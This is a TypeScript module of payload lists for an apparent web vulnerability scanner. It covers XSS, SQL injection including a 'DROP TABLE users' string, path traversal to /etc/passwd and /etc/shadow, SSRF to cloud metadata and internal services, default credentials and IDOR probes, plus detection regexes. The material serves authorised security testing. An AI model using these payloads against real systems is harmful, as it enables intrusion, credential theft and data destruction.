/**
 * vulnPayloads.ts — Curated security testing payloads.
 *
 * All payloads are used for authorised penetration testing only.
 * Payloads are intentionally benign markers where possible (e.g. XSS uses a
 * unique nonce so responses can be fingerprinted without executing anything).
 */

// ─── XSS ─────────────────────────────────────────────────────────────────────

export const XSS_PAYLOADS: string[] = [
  "<script>alert(1)</script>",
  "<img src=x onerror=alert(1)>",
  "<svg/onload=alert(1)>",
  "'\"><script>alert(1)</script>",
  "<body onload=alert(1)>",
  "javascript:alert(1)",
  "<iframe src=javascript:alert(1)>",
  "<input autofocus onfocus=alert(1)>",
  "<!--<img src=--><img src=x onerror=alert(1)>",
  "<details open ontoggle=alert(1)>",
  "<video><source onerror=alert(1)>",
  "<math><mtext></table></math><img src=x onerror=alert(1)>",
  "\"><img src=x onerror=alert(1)>",
  "';alert(1)//",
  "</script><script>alert(1)</script>",
];

// ─── SQLi ─────────────────────────────────────────────────────────────────────

export const SQLI_PAYLOADS: string[] = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' OR 1=1--",
  "\" OR \"1\"=\"1",
  "1' ORDER BY 1--",
  "1' ORDER BY 2--",
  "1' ORDER BY 3--",
  "1 AND 1=1",
  "1 AND 1=2",
  "' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "admin'--",
  "' OR SLEEP(2)--",
  "1; DROP TABLE users--",  // intentionally included — sqlmap also validates
];

// ─── Path Traversal ───────────────────────────────────────────────────────────

export const TRAVERSAL_PAYLOADS: string[] = [
  "../../../etc/passwd",
  "..%2F..%2F..%2Fetc%2Fpasswd",
  "....//....//....//etc/passwd",
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
  "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
  "..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
  "/etc/passwd",
  "/etc/shadow",
  "C:\\Windows\\System32\\drivers\\etc\\hosts",
  "....\\....\\....\\windows\\win.ini",
  "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
];

// ─── SSRF ────────────────────────────────────────────────────────────────────

export const SSRF_PAYLOADS: string[] = [
  "http://127.0.0.1/",
  "http://localhost/",
  "http://[::1]/",
  "http://169.254.169.254/latest/meta-data/",
  "http://0.0.0.0/",
  "http://2130706433/",            // 127.0.0.1 as decimal
  "http://017700000001/",          // 127.0.0.1 as octal
  "http://0x7f000001/",            // 127.0.0.1 as hex
  "file:///etc/passwd",
  "dict://127.0.0.1:11211/",
  "gopher://127.0.0.1:6379/_*1%0d%0a%244%0d%0aPING%0d%0a",
];

// ─── Auth bypass ─────────────────────────────────────────────────────────────

/** username → password pairs for basic auth/form bypass attempts */
export const AUTH_BYPASS_PAIRS: Array<{ user: string; pass: string }> = [
  { user: "admin",        pass: "admin" },
  { user: "admin",        pass: "password" },
  { user: "admin",        pass: "admin123" },
  { user: "admin",        pass: "" },
  { user: "administrator",pass: "administrator" },
  { user: "root",         pass: "root" },
  { user: "root",         pass: "toor" },
  { user: "guest",        pass: "guest" },
  { user: "test",         pass: "test" },
  { user: "user",         pass: "user" },
];

/** SQL auth bypass payloads to inject into username field */
export const AUTH_BYPASS_SQLI: string[] = [
  "' OR '1'='1",
  "' OR '1'='1'--",
  "admin'--",
  "admin' #",
  "' OR 1=1 LIMIT 1--",
  "\" OR \"1\"=\"1",
];

// ─── IDOR probes ──────────────────────────────────────────────────────────────

/** Given a numeric ID, return adjacent values to test for IDOR */
export function idorProbeIds(id: number): number[] {
  return [id - 1, id + 1, 0, 1, 999, 1000].filter(n => n >= 0);
}

// ─── Regex helpers ────────────────────────────────────────────────────────────

/** Match /etc/passwd output in a response body */
export const PASSWD_PATTERN = /root:.*:0:0:|daemon:.*:1:1:/;

/** Match Windows hosts file output */
export const HOSTS_PATTERN = /localhost|127\.0\.0\.1/i;

/** Match common SQLi error messages */
export const SQLI_ERROR_PATTERN =
  /you have an error in your sql syntax|warning: mysql|unclosed quotation mark|quoted string not properly terminated|pg_query\(\)|ORA-\d{5}|microsoft ole db provider for sql server/i;

/** Names of common URL parameters that may accept external URLs (SSRF surface) */
export const URL_PARAM_NAMES = ["url", "uri", "link", "src", "source", "redirect", "next", "goto", "target", "return", "returnurl", "callback", "image", "img", "file", "path"];

/** Names of parameters likely to accept file paths (traversal surface) */
export const FILE_PARAM_NAMES = ["file", "path", "filename", "filepath", "page", "include", "template", "doc", "document", "load", "read", "view"];
